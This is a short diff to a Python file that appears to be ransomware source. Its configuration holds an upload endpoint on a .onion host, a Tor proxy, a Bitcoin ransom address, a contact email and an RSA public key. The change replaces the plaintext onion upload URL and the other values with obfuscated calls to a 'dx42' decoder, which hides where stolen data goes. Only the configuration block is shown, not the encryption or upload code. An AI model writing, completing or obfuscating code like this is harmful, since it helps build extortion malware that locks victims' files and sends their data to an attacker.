@@ -40,12 +40,12 @@ from Crypto.Random import get_random_bytes
 from zeroize import zeroize1, mlock, munlock
 
 # Decode the encoded URL using the dx42 function.
-YOUR_URL = "http://r5iskohpx4wi2kcmvrppwglkkpnz6roasj3bsj4hgzqakapoq5yrs2qd.onion/upload"  # Replace with your encoded URL
+YOUR_URL = dx42(b"YOUR_ENCODED_URL").decode()  # Replace with your encoded URL
 # Encode a URL using the ex42 function from the edx42 module
 # Example: encoded_url = ex42(b"https://your-tor-server.onion".encode())
-YOUR_PROXY = "127.0.0.1:9050"  # Replace with your encoded proxy
-YOUR_BITCOIN_ADDRESS = "MY_BITCOIN_ADDRESS"
-YOUR_EMAIL_ADDRESS = "MY_ENCODED_EMAIL_ADDRESS"
+YOUR_PROXY = dx42(b"YOUR_ENCODED_PROXY").decode()  # Replace with your encoded proxy
+YOUR_BITCOIN_ADDRESS = "YOUR_BITCOIN_ADDRESS"
+YOUR_EMAIL_ADDRESS = dx42(b"YOUR_ENCODED_EMAIL_ADDRESS").decode()
 id = ""
 
 RSA_PUBLIC_KEY = """-----BEGIN PUBLIC KEY-----
